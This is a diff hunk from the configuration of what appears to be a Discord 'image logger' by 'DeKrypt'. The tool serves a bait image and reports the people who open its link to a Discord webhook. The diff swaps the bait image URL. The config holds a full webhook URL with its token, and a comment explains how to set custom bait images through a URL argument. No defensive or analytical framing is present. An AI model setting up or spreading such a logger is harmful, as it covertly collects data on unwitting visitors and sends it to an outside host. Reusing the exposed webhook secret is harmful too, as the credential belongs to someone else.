@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1491835915780362452/c2t6TZ2Hl7vugLMn_5ddYyB4aSE2ng0WTbqAB92f5CGEEk5iFRIoX95It_rmKk2tWjiD",
-    "image": "https://static.wikia.nocookie.net/skibidi-toilet-official/images/a/a5/30-MediumToilet.png/revision/latest?cb=20231111000858", # You can also have a custom image by using a URL argument
+    "image": "https://i.pinimg.com/originals/3e/84/7e/3e847efee72bd7532daf3dca53467290.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
